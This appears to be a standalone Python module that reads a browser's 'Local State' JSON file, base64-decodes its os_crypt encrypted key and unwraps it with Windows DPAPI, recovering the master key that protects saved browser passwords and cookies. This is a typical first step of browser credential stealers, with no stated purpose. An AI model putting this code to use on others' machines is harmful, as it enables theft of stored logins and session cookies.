import win32crypt


from os.path import isfile

from json import loads


from base64 import b64decode as BASE64_DECODE


CryptUnprotectData = win32crypt.CryptUnprotectData






class MasterKeyFetcher:

    def get_master_key(path : str):


        if not isfile(path):

            return None
        

        file = open(path , 'r+').read()

        file_JSON = loads(file)

        encrypted_key = file_JSON['os_crypt']['encrypted_key']


        dkey = BASE64_DECODE(encrypted_key)



        return CryptUnprotectData(dkey[ 5 : ],None, None, None, 0) [1]
    





